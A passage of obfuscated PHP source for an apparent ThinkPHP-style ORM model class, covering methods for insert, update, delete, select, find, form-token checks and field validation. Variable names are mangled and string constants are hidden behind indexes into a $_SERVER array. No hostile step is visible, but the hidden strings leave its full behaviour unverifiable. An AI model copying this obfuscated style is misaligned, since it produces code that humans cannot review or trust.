__unset($ê¤ó…´) { unset($this->data[$ê¤ó…´]); } public function __call($ïŞ”›¡, $ÎĞÃØ‰) { $ÓÉãæÓ =& $_SERVER[±³—úê]; if (in_array(strtolower($ïŞ”›¡), $this->methods, !0)) { $this->options[strtolower($ïŞ”›¡)] = $ÎĞÃØ‰[0]; return $this; } elseif (in_array(strtolower($ïŞ”›¡), array($ÓÉãæÓ[343], $ÓÉãæÓ[344], $ÓÉãæÓ[345], $ÓÉãæÓ[346], $ÓÉãæÓ[347]), !0)) { $ğÈÕÚªÃ = isset($ÎĞÃØ‰[0]) ? $ÎĞÃØ‰[0] : $ÓÉãæÓ[232]; $ğÈÕÚªÃ = $this->db->parseKey($ğÈÕÚªÃ); return $this->getField(strtoupper($ïŞ”›¡) . $ÓÉãæÓ[348] . $ğÈÕÚªÃ . $ÓÉãæÓ[349] . $ïŞ”›¡, $ÓÉãæÓ[343]); } elseif (strtolower(substr($ïŞ”›¡, 0, 5)) == $ÓÉãæÓ[350]) { $ğÈÕÚªÃ = think_parse_name(substr($ïŞ”›¡, 5)); $úòÚıäğ[$ğÈÕÚªÃ] = $ÎĞÃØ‰[0]; return $this->where($úòÚıäğ)->find(); } elseif (strtolower(substr($ïŞ”›¡, 0, 10)) == $ÓÉãæÓ[351]) { $á©§èğÖ = think_parse_name(substr($ïŞ”›¡, 10)); $úòÚıäğ[$á©§èğÖ] = $ÎĞÃØ‰[0]; return $this->where($úòÚıäğ)->getField($ÎĞÃØ‰[1]); } elseif (isset($this->_scope[$ïŞ”›¡])) { return $this->scope($ïŞ”›¡, $ÎĞÃØ‰[0]); } elseif (method_exists($this, $ïŞ”›¡)) { array_unshift($ÎĞÃØ‰, $ïŞ”›¡); return call_user_func_array(array($this, $ÓÉãæÓ[352]), $ÎĞÃØ‰); } else { return call_user_func_array(array(parent, $ïŞ”›¡), $ÎĞÃØ‰); } } protected function call() { $Ìß»¾Ì„ =& $_SERVER[±³—úê]; $›ª®š‘Ü = func_get_args(); $ƒç¸‰Â = array_shift($›ª®š‘Ü); $„–•–ğÒ = $ƒç¸‰Â; if (is_array($ƒç¸‰Â)) { $„–•–ğÒ = $ƒç¸‰Â[1]; $ƒç¸‰Â = $ƒç¸‰Â[0]; } $œÎÖúî = count($›ª®š‘Ü) - 1; if (isset($›ª®š‘Ü[$œÎÖúî]) && $›ª®š‘Ü[$œÎÖúî] === $ƒç¸‰Â) { think_exception(__CLASS__ . $Ìß»¾Ì„[4] . $ƒç¸‰Â . think_lang($Ìß»¾Ì„[353])); return; } $›ª®š‘Ü[] = $ƒç¸‰Â; if (method_exists($this, $Ìß»¾Ì„[354])) { $•ÆÄÛÅò = call_user_func_array(array($this, $Ìß»¾Ì„[355]), array($„–•–ğÒ, $›ª®š‘Ü)); if (!is_null($•ÆÄÛÅò) && $•ÆÄÛÅò !== !1) { return $•ÆÄÛÅò; } } $êÒ×ß‚Í = call_user_func_array(array($this, $ƒç¸‰Â), $›ª®š‘Ü); if (method_exists($this, $Ìß»¾Ì„[356])) { $•ÆÄÛÅò = call_user_func_array(array($this, $Ìß»¾Ì„[357]), array($„–•–ğÒ, $›ª®š‘Ü, $êÒ×ß‚Í)); if ($•ÆÄÛÅò) { return $•ÆÄÛÅò; } } return $êÒ×ß‚Í; } protected function _initialize() { } protected function _facade($Ì’ˆ¢) { $–óÎÇû“ =& $_SERVER[±³—úê]; if (!empty($this->fields)) { foreach ($Ì’ˆ¢ as $Ïã›÷‘² => $ç¬òÑ°«) { if (is_array($this->fields) && !in_array($Ïã›÷‘², $this->fields, !0)) { unset($Ì’ˆ¢[$Ïã›÷‘²]); } elseif (is_scalar($ç¬òÑ°«)) { $this->_parseType($Ì’ˆ¢, $Ïã›÷‘²); } } } if (!empty($this->options[$–óÎÇû“[358]])) { $Ì’ˆ¢ = array_map($this->options[$–óÎÇû“[358]], $Ì’ˆ¢); unset($this->options[$–óÎÇû“[358]]); } $this->_beforeWrite($Ì’ˆ¢); return $Ì’ˆ¢; } protected function _beforeWrite(&$‚Ëê£Ä©) { } public function add($–€õãº’ = '', $¥µåÛã‰ = array(), $èœ®„²™ = false) { if (empty($–€õãº’)) { if (!empty($this->data)) { $–€õãº’ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[±³—úê][359]); return !1; } } $¥µåÛã‰ = $this->_parseOptions($¥µåÛã‰); $–€õãº’ = $this->_facade($–€õãº’); if (!1 === $this->_beforeInsert($–€õãº’, $¥µåÛã‰)) { return !1; } $ò¢ØÃ¶ = $this->db->insert($–€õãº’, $¥µåÛã‰, $èœ®„²™); if (!1 !== $ò¢ØÃ¶) { $Şş€³Ù = $this->getLastInsID(); if ($Şş€³Ù) { $–€õãº’[$this->getPk()] = $Şş€³Ù; $this->_after_insert($–€õãº’, $¥µåÛã‰); return $Şş€³Ù; } $this->_after_insert($–€õãº’, $¥µåÛã‰); } return $ò¢ØÃ¶; } protected function _beforeInsert(&$èÅíºç, $ŠÕ„‘§ß) { } protected function _after_insert($¥åÙøš«, $ŸÎı¬Õº) { } public function addAll($ŞŞÕÕİÉ, $×ãã›ß” = array(), $Œã±ñõ = false) { $¬‡é³Ëğ =& $_SERVER[±³—úê]; if (empty($ŞŞÕÕİÉ)) { $this->error = think_lang($¬‡é³Ëğ[359]); return !1; } $×ãã›ß” = $this->_parseOptions($×ãã›ß”); foreach ($ŞŞÕÕİÉ as $÷©ÃâÎæ => $¾¢§“‹) { $ŞŞÕÕİÉ[$÷©ÃâÎæ] = $this->_facade($¾¢§“‹); } if (method_exists($this->db, $¬‡é³Ëğ[360])) { $íÉÃ€Ñ = $this->db->insertAll($ŞŞÕÕİÉ, $×ãã›ß”, $Œã±ñõ); } else { $this->startTrans(); foreach ($ŞŞÕÕİÉ as $÷©ÃâÎæ => $¾¢§“‹) { $íÉÃ€Ñ = $this->db->insert($¾¢§“‹, $×ãã›ß”, $Œã±ñõ); } $this->commit(); } if (!1 !== $íÉÃ€Ñ) { $‘Öè±É£ = $this->getLastInsID(); if ($‘Öè±É£) { return $‘Öè±É£; } } return $íÉÃ€Ñ; } public function selectAdd($ñÎ˜™Ä“ = '', $™œ ñÃ„ = '', $ÒÊ²Ÿ†¥ = array()) { $¬¼ÑºİÚ =& $_SERVER[±³—úê]; $ÒÊ²Ÿ†¥ = $this->_parseOptions($ÒÊ²Ÿ†¥); if (!1 === ($¦Ûó„² = $this->db->selectInsert($ñÎ˜™Ä“ ? $ñÎ˜™Ä“ : $ÒÊ²Ÿ†¥[$¬¼ÑºİÚ[361]], $™œ ñÃ„ ? $™œ ñÃ„ : $this->getTableName(), $ÒÊ²Ÿ†¥))) { $this->error = think_lang($¬¼ÑºİÚ[362]); return !1; } else { return $¦Ûó„²; } } public function save($ÛÃËôæ» = '', $¿±…ÇŠ = array()) { $Îû¬…ÎÈ =& $_SERVER[±³—úê]; if (empty($ÛÃËôæ»)) { if (!empty($this->data)) { $ÛÃËôæ» = $this->data; $this->data = array(); } else { $this->error = think_lang($Îû¬…ÎÈ[359]); return !1; } } $ÛÃËôæ» = $this->_facade($ÛÃËôæ»); $¿±…ÇŠ = $this->_parseOptions($¿±…ÇŠ); $ı™¦ÖÜ© = $this->getPk(); if (!isset($¿±…ÇŠ[$Îû¬…ÎÈ[363]])) { if (isset($ÛÃËôæ»[$ı™¦ÖÜ©])) { $¬’İã÷[$ı™¦ÖÜ©] = $ÛÃËôæ»[$ı™¦ÖÜ©]; $¿±…ÇŠ[$Îû¬…ÎÈ[363]] = $¬’İã÷; unset($ÛÃËôæ»[$ı™¦ÖÜ©]); } else { $this->error = think_lang($Îû¬…ÎÈ[362]); return !1; } } if (is_array($¿±…ÇŠ[$Îû¬…ÎÈ[363]]) && isset($¿±…ÇŠ[$Îû¬…ÎÈ[363]][$ı™¦ÖÜ©])) { $Ó£Ëä™Ñ = $¿±…ÇŠ[$Îû¬…ÎÈ[363]][$ı™¦ÖÜ©]; } if (!1 === $this->_beforeUpdate($ÛÃËôæ», $¿±…ÇŠ)) { return !1; } $Úš®’ª° = $this->db->update($ÛÃËôæ», $¿±…ÇŠ); if (!1 !== $Úš®’ª°) { if (isset($Ó£Ëä™Ñ)) { $ÛÃËôæ»[$ı™¦ÖÜ©] = $Ó£Ëä™Ñ; } $this->_afterUpdate($ÛÃËôæ», $¿±…ÇŠ); } return $Úš®’ª°; } protected function _beforeUpdate(&$¾Îîõ, $¦¹ªå‰ì) { } protected function _afterUpdate($ØÀ€ó¡Ò, $ù£Œà–) { } public function delete($–î¯ˆ = array()) { $ø†·‰¼Ã =& $_SERVER[±³—úê]; if (empty($–î¯ˆ) && empty($this->options[$ø†·‰¼Ã[363]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Ó†äóİ» = $this->getPk(); if (is_numeric($–î¯ˆ) || is_string($–î¯ˆ)) { if (strpos($–î¯ˆ, $ø†·‰¼Ã[50])) { $Ş‹·²¯‘[$Ó†äóİ»] = array($ø†·‰¼Ã[364], $–î¯ˆ); } else { $Ş‹·²¯‘[$Ó†äóİ»] = $–î¯ˆ; } $this->options[$ø†·‰¼Ã[363]] = $Ş‹·²¯‘; } $–î¯ˆ = $this->_parseOptions(); if (is_array($–î¯ˆ[$ø†·‰¼Ã[363]]) && isset($–î¯ˆ[$ø†·‰¼Ã[363]][$Ó†äóİ»])) { $£‡Å‹Ü™ = $–î¯ˆ[$ø†·‰¼Ã[363]][$Ó†äóİ»]; } $§º¼£îÄ = $this->db->delete($–î¯ˆ); if (!1 !== $§º¼£îÄ) { $ÈÉµ§Ë = array(); if (isset($£‡Å‹Ü™)) { $ÈÉµ§Ë[$Ó†äóİ»] = $£‡Å‹Ü™; } $this->_after_delete($ÈÉµ§Ë, $–î¯ˆ); } return $§º¼£îÄ; } protected function _after_delete($´üõ Åˆ, $øÛŸªÜµ) { } public function select($€Òˆ¡´ = array()) { $¶™ãíƒµ =& $_SERVER[±³—úê]; if (is_string($€Òˆ¡´) || is_numeric($€Òˆ¡´)) { $€İÏş–ü = $this->getPk(); if (strpos($€Òˆ¡´, $¶™ãíƒµ[50])) { $ø‹Ö¬‚Æ[$€İÏş–ü] = array($¶™ãíƒµ[364], $€Òˆ¡´); } else { $ø‹Ö¬‚Æ[$€İÏş–ü] = $€Òˆ¡´; } $this->options[$¶™ãíƒµ[363]] = $ø‹Ö¬‚Æ; } elseif (!1 === $€Òˆ¡´) { $€Òˆ¡´ = $this->_parseOptions(); return $¶™ãíƒµ[365] . $this->db->buildSelectSql($€Òˆ¡´) . $¶™ãíƒµ[366]; } $€Òˆ¡´ = $this->_parseOptions(); $†ˆ¥º = $this->db->select($€Òˆ¡´); if (!1 === $†ˆ¥º) { return !1; } if (empty($†ˆ¥º)) { return null; } $this->_afterSelect($†ˆ¥º, $€Òˆ¡´); return $†ˆ¥º; } protected function _afterSelect(&$çœ¬ö®Ö, $‹°ú¡») { } public function buildSql($‚Ê€»™Ñ = array()) { $çôàº =& $_SERVER[±³—úê]; $‚Ê€»™Ñ = $this->_parseOptions($‚Ê€»™Ñ); return $çôàº[365] . $this->db->buildSelectSql($‚Ê€»™Ñ) . $çôàº[366]; } public function optionsValue($â†–‰ç = null) { if (is_null($â†–‰ç)) { return $this->options; } elseif (is_array($â†–‰ç)) { $this->options = array_merge($this->options, $â†–‰ç); } } protected function _parseOptions($•·ù¡ÃÊ = array()) { $ƒ¼ã¥´¨ =& $_SERVER[±³—úê]; if (is_array($•·ù¡ÃÊ)) { $•·ù¡ÃÊ = array_merge($this->options, $•·ù¡ÃÊ); } $this->options = array(); if (!isset($•·ù¡ÃÊ[$ƒ¼ã¥´¨[367]])) { $•·ù¡ÃÊ[$ƒ¼ã¥´¨[367]] = $this->getTableName(); $Èú¯ƒäç = $this->fields; } else { $Èú¯ƒäç = $this->getDbFields(); } if (!empty($•·ù¡ÃÊ[$ƒ¼ã¥´¨[368]])) { $•·ù¡ÃÊ[$ƒ¼ã¥´¨[367]] .= $ƒ¼ã¥´¨[53] . $•·ù¡ÃÊ[$ƒ¼ã¥´¨[368]]; } $•·ù¡ÃÊ[$ƒ¼ã¥´¨[369]] = $this->name; if (isset($•·ù¡ÃÊ[$ƒ¼ã¥´¨[363]]) && is_array($•·ù¡ÃÊ[$ƒ¼ã¥´¨[363]]) && !empty($Èú¯ƒäç) && !isset($•·ù¡ÃÊ[$ƒ¼ã¥´¨[370]]) && !isset($•·ù¡ÃÊ[$ƒ¼ã¥´¨[367]])) { foreach ($•·ù¡ÃÊ[$ƒ¼ã¥´¨[363]] as $¸ØŠÚå¤ => $„âËœÃ) { $¸ØŠÚå¤ = trim($¸ØŠÚå¤); if (in_array($¸ØŠÚå¤, $Èú¯ƒäç, !0)) { if (is_scalar($„âËœÃ)) { $this->_parseType($•·ù¡ÃÊ[$ƒ¼ã¥´¨[363]], $¸ØŠÚå¤); } } elseif (!is_numeric($¸ØŠÚå¤) && $ƒ¼ã¥´¨[11] != substr($¸ØŠÚå¤, 0, 1) && !1 === strpos($¸ØŠÚå¤, $ƒ¼ã¥´¨[10]) && !1 === strpos($¸ØŠÚå¤, $ƒ¼ã¥´¨[348]) && !1 === strpos($¸ØŠÚå¤, $ƒ¼ã¥´¨[214]) && !1 === strpos($¸ØŠÚå¤, $ƒ¼ã¥´¨[296])) { unset($•·ù¡ÃÊ[$ƒ¼ã¥´¨[363]][$¸ØŠÚå¤]); } } } $this->_options_filter($•·ù¡ÃÊ); return $•·ù¡ÃÊ; } protected function _options_filter(&$èéë¡‡‚) { } protected function _parseType(&$ÓÀåŞ´, $ğ’èÍ‘) { $«¹¨ç¹© =& $_SERVER[±³—úê]; if (empty($this->options[$«¹¨ç¹©[371]][$«¹¨ç¹©[4] . $ğ’èÍ‘])) { $‡ÚĞÛ›´ = strtolower($this->fields[$«¹¨ç¹©[340]][$ğ’èÍ‘]); if (!1 !== strpos($‡ÚĞÛ›´, $«¹¨ç¹©[372])) { } elseif (!1 === strpos($‡ÚĞÛ›´, $«¹¨ç¹©[373]) && !1 !== strpos($‡ÚĞÛ›´, $«¹¨ç¹©[374])) { $ÓÀåŞ´[$ğ’èÍ‘] = intval($ÓÀåŞ´[$ğ’èÍ‘]); } elseif (!1 !== strpos($‡ÚĞÛ›´, $«¹¨ç¹©[375]) || !1 !== strpos($‡ÚĞÛ›´, $«¹¨ç¹©[376])) { $ÓÀåŞ´[$ğ’èÍ‘] = floatval($ÓÀåŞ´[$ğ’èÍ‘]); } elseif (!1 !== strpos($‡ÚĞÛ›´, $«¹¨ç¹©[377])) { $ÓÀåŞ´[$ğ’èÍ‘] = (bool) $ÓÀåŞ´[$ğ’èÍ‘]; } } } public function find($â‚ÙËîÑ = array()) { $ˆœ¢×ô =& $_SERVER[±³—úê]; if (is_numeric($â‚ÙËîÑ) || is_string($â‚ÙËîÑ)) { $€à´—†[$this->getPk()] = intval($â‚ÙËîÑ); $this->options[$ˆœ¢×ô[363]] = $€à´—†; } $this->options[$ˆœ¢×ô[378]] = 1; $â‚ÙËîÑ = $this->_parseOptions(); $­ùÎ³ÇË = $this->db->select($â‚ÙËîÑ); if (!1 === $­ùÎ³ÇË) { return !1; } if (empty($­ùÎ³ÇË)) { return null; } $this->data = $­ùÎ³ÇË[0]; $this->_afterFind($this->data, $â‚ÙËîÑ); if (!empty($this->options[$ˆœ¢×ô[379]])) { return $this->returnResult($this->data, $this->options[$ˆœ¢×ô[379]]); } return $this->data; } protected function _afterFind(&$ÂÕ±Äè—, $å±ğÁæì) { } protected function returnResult($ÕÛó”ÁŠ, $Šõ§“˜ä = '') { $ûÍó‘ =& $_SERVER[±³—úê]; if ($Šõ§“˜ä) { if (is_callable($Šõ§“˜ä)) { return call_user_func($Šõ§“˜ä, $ÕÛó”ÁŠ); } switch (strtolower($Šõ§“˜ä)) { case $ûÍó‘[380]: return json_encode($ÕÛó”ÁŠ); case $ûÍó‘[381]: return xml_encode($ÕÛó”ÁŠ); } } return $ÕÛó”ÁŠ; } public function parseFieldsMap($†èÑæû³, $ÜÁ‡·”ô = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ËŠ®Ÿ‚· => $áç¡¢£ê) { if ($ÜÁ‡·”ô == 1) { if (isset($†èÑæû³[$áç¡¢£ê])) { $†èÑæû³[$ËŠ®Ÿ‚·] = $†èÑæû³[$áç¡¢£ê]; unset($†èÑæû³[$áç¡¢£ê]); } } else { if (isset($†èÑæû³[$ËŠ®Ÿ‚·])) { $†èÑæû³[$áç¡¢£ê] = $†èÑæû³[$ËŠ®Ÿ‚·]; unset($†èÑæû³[$ËŠ®Ÿ‚·]); } } } } return $†èÑæû³; } public function setField($Òıí“, $„…÷Ùˆ = '') { if (is_array($Òıí“)) { $ä÷ã‰Ñ = $Òıí“; } else { $ä÷ã‰Ñ[$Òıí“] = $„…÷Ùˆ; } return $this->save($ä÷ã‰Ñ); } public function setAdd($…­àÏøæ, $êêŒ²“á = 1) { $ñ½Š‡‰© =& $_SERVER[±³—úê]; $•¹­Òö = $…­àÏøæ . $ñ½Š‡‰©[382] . $êêŒ²“á; if ($êêŒ²“á < 0) { $•¹­Òö = $…­àÏøæ . $êêŒ²“á; } return $this->setField($…­àÏøæ, array($ñ½Š‡‰©[383], $•¹­Òö)); } public function getField($Úù–‰åŒ, $õÚ³ßÍ = null) { $­ÁÖ…­ =& $_SERVER[±³—úê]; $¼–Œï±[$­ÁÖ…­[361]] = $Úù–‰åŒ; $¼–Œï± = $this->_parseOptions($¼–Œï±); $Úù–‰åŒ = trim($Úù–‰åŒ); if (strpos($Úù–‰åŒ, $­ÁÖ…­[50])) { if (!isset($¼–Œï±[$­ÁÖ…­[378]])) { $¼–Œï±[$­ÁÖ…­[378]] = is_numeric($õÚ³ßÍ) ? $õÚ³ßÍ : $­ÁÖ…­[12]; } $É®ÜâÛş = $this->db->select($¼–Œï±); if (!empty($É®ÜâÛş)) { $§ÖöÓ’ = explode($­ÁÖ…­[50], $Úù–‰åŒ); $Úù–‰åŒ = array_keys($É®ÜâÛş[0]); $ÑŠ¾ğã = array_shift($Úù–‰åŒ); $…£‡”ïá = array_shift($Úù–‰åŒ); $ÑèúõùÒ = array(); $ìô©©Š = count($§ÖöÓ’); foreach ($É®ÜâÛş as $è¤¿¥ø„) { $ÛÑ©¿‡ = $è¤¿¥ø„[$ÑŠ¾ğã]; if (2 == $ìô©©Š) { $ÑèúõùÒ[$ÛÑ©¿‡] = $è¤¿¥ø„[$…£‡”ïá]; } else { $ÑèúõùÒ[$ÛÑ©¿‡] = is_string($õÚ³ßÍ) ? implode($õÚ³ßÍ, $è¤¿¥ø„) : $è¤¿¥ø„; } } return $ÑèúõùÒ; } } else { if (!0 !== $õÚ³ßÍ) { $¼–Œï±[$­ÁÖ…­[378]] = is_numeric($õÚ³ßÍ) ? $õÚ³ßÍ : 1; } if ($õÚ³ßÍ === $­ÁÖ…­[343]) { unset($¼–Œï±[$­ÁÖ…­[378]]); } $è¤¿¥ø„ = $this->db->select($¼–Œï±); if (!empty($è¤¿¥ø„)) { if ($õÚ³ßÍ === $­ÁÖ…­[343]) { return reset($è¤¿¥ø„[0]); } if (!0 !== $õÚ³ßÍ && 1 == $¼–Œï±[$­ÁÖ…­[378]]) { return reset($è¤¿¥ø„[0]); } foreach ($è¤¿¥ø„ as $ç‡¥Ã¬) { $‹î„´©©[] = $ç‡¥Ã¬[$Úù–‰åŒ]; } return $‹î„´©©; } } return null; } public function create($€İ¾íË  = '', $ÌÖ–İñï = '') { $å–ÇÄ‚„ =& $_SERVER[±³—úê]; if (empty($€İ¾íË )) { $€İ¾íË  = $_POST; } elseif (is_object($€İ¾íË )) { $€İ¾íË  = get_object_vars($€İ¾íË ); } if (empty($€İ¾íË ) || !is_array($€İ¾íË )) { $this->error = think_lang($å–ÇÄ‚„[359]); return !1; } $€İ¾íË  = $this->parseFieldsMap($€İ¾íË , 0); $ÌÖ–İñï = $ÌÖ–İñï ? $ÌÖ–İñï : (!empty($€İ¾íË [$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$å–ÇÄ‚„[361]])) { $øò¤•©½ = $this->options[$å–ÇÄ‚„[361]]; unset($this->options[$å–ÇÄ‚„[361]]); } elseif ($ÌÖ–İñï == THINK_MODEL_INSERT && isset($this->insertFields)) { $øò¤•©½ = $this->insertFields; } elseif ($ÌÖ–İñï == THINK_MODEL_UPDATE && isset($this->updateFields)) { $øò¤•©½ = $this->updateFields; } if (isset($øò¤•©½)) { if (is_string($øò¤•©½)) { $øò¤•©½ = explode($å–ÇÄ‚„[50], $øò¤•©½); } if (think_config($å–ÇÄ‚„[384])) { $øò¤•©½[] = think_config($å–ÇÄ‚„[385]); } foreach ($€İ¾íË  as $æŠŸ·ˆ¢ => $ÛÜÕÛê) { if (!in_array($æŠŸ·ˆ¢, $øò¤•©½)) { unset($€İ¾íË [$æŠŸ·ˆ¢]); } } } if (!$this->autoValidation($€İ¾íË , $ÌÖ–İñï)) { return !1; } if (!$this->autoCheckToken($€İ¾íË )) { $this->error = think_lang($å–ÇÄ‚„[386]); return !1; } if ($this->autoCheckFields) { $øò¤•©½ = $this->getDbFields(); foreach ($€İ¾íË  as $æŠŸ·ˆ¢ => $ÛÜÕÛê) { if (!in_array($æŠŸ·ˆ¢, $øò¤•©½)) { unset($€İ¾íË [$æŠŸ·ˆ¢]); } elseif (MAGIC_QUOTES_GPC && is_string($ÛÜÕÛê)) { $€İ¾íË [$æŠŸ·ˆ¢] = stripslashes($ÛÜÕÛê); } } } $this->autoOperation($€İ¾íË , $ÌÖ–İñï); $this->data = $€İ¾íË ; return $€İ¾íË ; } public function autoCheckToken($§ÂÙø‘œ) { $±’°ïÚÈ =& $_SERVER[±³—úê]; if (isset($this->options[$±’°ïÚÈ[387]]) && !$this->options[$±’°ïÚÈ[387]]) { return !0; } if (think_config($±’°ïÚÈ[384])) { $ãËŞà¬ = think_config($±’°ïÚÈ[385]); if (!isset($§ÂÙø‘œ[$ãËŞà¬]) || Session::get($ãËŞà¬)) { return !1; } list($à¡Ãí³×, $Ğ×Ñ”Ûë) = explode($±’°ïÚÈ[11], $§ÂÙø‘œ[$ãËŞà¬]); if ($Ğ×Ñ”Ûë && Session::get($ãËŞà¬ . $±’°ïÚÈ[10] . $à¡Ãí³×) === $Ğ×Ñ”Ûë) { Session::remove($ãËŞà¬ . $±’°ïÚÈ[10] . $à¡Ãí³×); return !0; } if (think_config($±’°ïÚÈ[388])) { Session::remove($ãËŞà¬ . $±’°ïÚÈ[10] . $à¡Ãí³×); } return !1; } return !0; } public function regex($æÚ®å®™, $‚ü¢ıó) { $µª¾’ä =& $_SERVER[±³—úê]; $²…ÇŸÙí = array($µª¾’ä[389] => $µª¾’ä[390], $µª¾’ä[391] => $µª¾’ä[392], $µª¾’ä[393] => $µª¾’ä[394], $µª¾’ä[395] => $µª¾’ä[396], $µª¾’ä[397] => $µª¾’ä[398], $µª¾’ä[399] => $µª¾’ä[400], $µª¾’ä[401] => $µª¾’ä[402], $µª¾’ä[376] => $µª¾’ä[403], $µª¾’ä[404] => $µª¾’ä[405]); if (isset($²…ÇŸÙí[strtolower($‚ü¢ıó)])) { $‚ü¢ıó = $²…ÇŸÙí[strtolower($‚ü¢ıó)]; } return preg_match($‚ü¢ıó, $æÚ®å®™) === 1; } private function autoOperation(&$‚®¼‰ƒ, $ˆÊøë¢ö) { $…ÛÌöš£ =& $_SERVER[±³—úê]; if (!empty($this->options[$…ÛÌöš£[406]])) { $–û‡ıô• = $this->options[$…ÛÌöš£[406]]; unset($this->options[$…ÛÌöš£[406]]); } elseif (!empty($this->_auto)) { $–û‡ıô• = $this->_auto; } if (isset($–û‡ıô•)) { foreach ($–û‡ıô• as $Ç´‰ÃæÖ) { if (empty($Ç´‰ÃæÖ[2])) { $Ç´‰ÃæÖ[2] = THINK_MODEL_INSERT; } if ($ˆÊøë¢ö == $Ç´‰ÃæÖ[2] || $Ç´‰ÃæÖ[2] == THINK_MODEL_BOTH) { switch (trim($Ç´‰ÃæÖ[3])) { case $…ÛÌöš£[407]: case $…ÛÌöš£[408]: $˜Ù´›î² = isset($Ç´‰ÃæÖ[4]) ? (array) $Ç´‰ÃæÖ[4] : array(); if (isset($‚®¼‰ƒ[$Ç´‰ÃæÖ[0]])) { array_unshift($˜Ù´›î², $‚®¼‰ƒ[$Ç´‰ÃæÖ[0]]); } if ($…ÛÌöš£[407] == $Ç´‰ÃæÖ[3]) { $‚®¼‰ƒ[$Ç´‰ÃæÖ[0]] = call_user_func_array($Ç´‰ÃæÖ[1], $˜Ù´›î²); } else { $‚®¼‰ƒ[$Ç´‰ÃæÖ[0]] = call_user_func_array(array(&$this, $Ç´‰ÃæÖ[1]), $˜Ù´›î²); } break; case $…ÛÌöš£[361]: $‚®¼‰ƒ[$Ç´‰ÃæÖ[0]] = $‚®¼‰ƒ[$Ç´‰ÃæÖ[1]]; break; case $…ÛÌöš£[409]: if ($…ÛÌöš£[12] === $‚®¼‰ƒ[$Ç´‰ÃæÖ[0]]) { unset($‚®¼‰ƒ[$Ç´‰ÃæÖ[0]]); } break; case $…ÛÌöš£[410]: default: $‚®¼‰ƒ[$Ç´‰ÃæÖ[0]] = $Ç´‰ÃæÖ[1]; } if (!1 === $‚®¼‰ƒ[$Ç´‰ÃæÖ[0]]) { unset($‚®¼‰ƒ[$Ç´‰ÃæÖ[0]]); } } } } return $‚®¼‰ƒ; } protected function autoValidation($Îñ¸‡•, $Ş²…ÈÁ) { $ñ¯šóòÎ =& $_SERVER[±³—úê]; if (!empty($this->options[$ñ¯šóòÎ[411]])) { $ŒâµØ = $this->options[$ñ¯šóòÎ[411]]; unset($this->options[$ñ¯šóòÎ[411]]); } elseif (!empty($this->_validate)) { $ŒâµØ = $this->_validate; } if (isset($ŒâµØ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ŒâµØ as $èµÁ›©÷ => $ƒĞëÅè¡) { if (empty($ƒĞëÅè¡[5]) || $ƒĞëÅè¡[5] == THINK_MODEL_BOTH || $ƒĞëÅè¡[5] == $Ş²…ÈÁ) { if (0 == strpos($ƒĞëÅè¡[2], $ñ¯šóòÎ[412]) && strpos($ƒĞëÅè¡[2], $ñ¯šóòÎ[413])) { $ƒĞëÅè¡[2] = think_lang(substr($ƒĞëÅè¡[2], 2, -1)); } $ƒĞëÅè¡[3] = isset($ƒĞëÅè¡[3]) ? $ƒĞëÅè¡[3] : THINK_EXISTS_VALIDATE; $ƒĞëÅè¡[4] = isset($ƒĞëÅè¡[4]) ? $ƒĞëÅè¡[4] : $ñ¯šóòÎ[414]; switch ($ƒĞëÅè¡[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Îñ¸‡•, $ƒĞëÅè¡)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ñ¯šóòÎ[12] != trim($Îñ¸‡•[$ƒĞëÅè¡[0]])) { if (!1 === $this->_validationField($Îñ¸‡•, $ƒĞëÅè¡)) { return !1; } } break; default: if (isset($Îñ¸‡•[$ƒĞëÅè¡[0]])) { if (!1 === $this->_validationField($Îñ¸‡•, $ƒĞëÅè¡)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($çş´Åä, $½‡Ú•ä‰) { if (!1 === $this->_validationFieldItem($çş´Åä, $½‡Ú•ä‰)) { if ($this->patchValidate) { $this->error[$½‡Ú•ä‰[0]] = $½‡Ú•ä‰[2]; } else { $this->error = $½‡Ú•ä‰[2]; return !1; } } return; } protected function _validationFieldItem($ùÜ—ñÚ¨, $áëÆ–Ãš) { $¹ó‘Ûì– =& $_SERVER[±³—úê]; switch (strtolower(trim($áëÆ–Ãš[4]))) { case $¹ó‘Ûì–[407]: case $¹ó‘Ûì–[408]: $Í¸§Ğô = isset($áëÆ–Ãš[6]) ? (array) $áëÆ–Ãš[6] : array(); if (is_string($áëÆ–Ãš[0]) && strpos($áëÆ–Ãš[0], $¹ó‘Ûì–[50])) { $áëÆ–Ãš[0] = explode($¹ó‘Ûì–[50], $áëÆ–Ãš[0]); } if (is_array($áëÆ–Ãš[0])) { foreach ($áëÆ–Ãš[0] as $ß±£ÚãÅ) { $Ô²öáÇ¥[$ß±£ÚãÅ] = $ùÜ—ñÚ¨[$ß±£ÚãÅ]; } array_unshift($Í¸§Ğô, $Ô²öáÇ¥); } else { array_unshift($Í¸§Ğô, $ùÜ—ñÚ¨[$áëÆ–Ãš[0]]); } if ($¹ó‘Ûì–[407] == $áëÆ–Ãš[4]) { return call_user_func_array($áëÆ–Ãš[1], $Í¸§Ğô); } else { return call_user_func_array(array(&$this, $áëÆ–Ãš[1]), $Í¸§Ğô); } case $¹ó‘Ûì–[415]: return $ùÜ—ñÚ¨[$áëÆ–Ãš[0]] == $ùÜ—ñÚ¨[$áëÆ–Ãš[1]]; case $¹ó‘Ûì–[416]: if (is_string($áëÆ–Ãš[0]) && strpos($áëÆ–Ãš[0], $¹ó‘Ûì–[50])) { $áëÆ–Ãš[0] = explode($¹ó‘Ûì–[50], $áëÆ–Ãš[0]); } $ğŠ¬•×ú = array(); if (is_array($áëÆ–Ãš[0])) { foreach ($áëÆ–Ãš[0] as $ß±£ÚãÅ) { $ğŠ¬•×ú[$ß±£ÚãÅ] = $ùÜ—ñÚ¨[$ß±£ÚãÅ]; } } else { $ğŠ¬•×ú[$áëÆ–Ãš[0]] = $ùÜ—ñÚ¨[$áëÆ–Ãš[0]]; } if (!empty($ùÜ—ñÚ¨[$this->getPk()])) { $ğŠ¬•×ú[$this->getPk()] = array($¹ó‘Ûì–[417], $ùÜ—ñÚ¨[$this->getPk()]); } if ($this->where($ğŠ¬•×ú)->find()) { return !1; } return !0; 